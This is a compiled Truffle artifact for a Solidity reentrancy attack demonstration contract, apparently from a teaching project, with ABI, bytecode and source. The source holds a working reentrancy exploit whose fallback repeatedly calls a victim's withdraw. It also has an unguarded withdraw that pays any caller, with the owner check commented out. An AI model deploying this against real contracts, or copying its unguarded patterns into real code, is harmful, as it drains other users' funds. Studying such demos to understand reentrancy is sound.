{
  "contractName": "AttackContract",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "counter",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        },
        {
          "name": "_victim",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fund",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "balanceOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516040806104ba8339810180604052604081101561003057600080fd5b810190808051906020019092919080519060200190929190505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050506103bb806100ff6000396000f3fe608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633ccfd60b1461009f57806361bc221a146100a9578063722713f7146100d4578063930c2003146100ff5780639e5faafc14610156578063b60d428814610160578063d0e30db01461016a575b60016000815480929190600101919050555061009d610181565b005b6100a7610233565b005b3480156100b557600080fd5b506100be6102b2565b6040518082815260200191505060405180910390f35b3480156100e057600080fd5b506100e96102b8565b6040518082815260200191505060405180910390f35b34801561010b57600080fd5b506101146102d7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61015e610181565b005b6101686102fc565b005b34801561017657600080fd5b5061017f6102fe565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561021957600080fd5b505af115801561022d573d6000803e3d6000fd5b50505050565b3373ffffffffffffffffffffffffffffffffffffffff163073ffffffffffffffffffffffffffffffffffffffff163160405180600001905060006040518083038185875af1925050503d80600081146102a8576040519150601f19603f3d011682016040523d82523d6000602084013e6102ad565b606091505b505050565b60015481565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a764000060405180600001905060006040518083038185875af1925050503d8060008114610385576040519150601f19603f3d011682016040523d82523d6000602084013e61038a565b606091505b50505056fea165627a7a72305820d885ff75547bdfc13961c3ece7174a35f5683e2a566619ffb5e80a9c97e074120029",
  "source": "pragma solidity 0.5.0;\r\n\r\nimport \"./VictimContract.sol\";\r\n\r\ncontract AttackContract {\r\n    VictimContract public victim;\r\n    uint256 public counter;\r\n    address owner;\r\n\r\n    constructor(address _owner, address payable _victim) public {\r\n        owner = owner;\r\n        victim = VictimContract(_victim);\r\n    }\r\n\r\n    function() external payable {\r\n        counter++;\r\n        attack();\r\n    }\r\n\r\n    function attack() public payable {\r\n        victim.withdraw(1 ether);\r\n    }\r\n\r\n    function deposit() public {\r\n        address(victim).call.value(1 ether)(\"\");\r\n    }\r\n\r\n    function fund() public payable {}\r\n\r\n    function withdraw() public payable {\r\n        // require(msg.sender == owner, \"not the owner of the contract\");\r\n        msg.sender.call.value(address(this).balance)(\"\");\r\n    }\r\n\r\n    function balanceOf() public view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n",
  "sourcePath": "C:/Lgm local/reentrancy_attack_example/contracts/AttackContract.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.3.2",
  "updatedAt": "2020-11-18T12:53:37.613Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}